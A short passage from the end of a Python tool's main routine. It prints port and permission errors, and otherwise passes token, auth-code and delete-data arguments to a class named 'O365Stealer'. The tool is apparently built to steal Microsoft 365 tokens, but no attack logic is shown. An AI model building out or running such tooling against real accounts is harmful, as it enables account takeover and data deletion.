                # Handle errors when trying to run the app
                print(crayons.red("\r\n[-] Permission denied or port " + str(PORT) + " is busy", bold=True))
                print(crayons.red("Error: " + str(e), bold=True))

    else:
        if args.refresh_token or args.token_path or args.token or args.code or args.delete_all_data or args.delete_user_data:
            stealer_instance = O365Stealer(args=args)
            stealer_instance.main()
        else:
            arg_parser.parser.print_help()
            sys.exit()
    

main()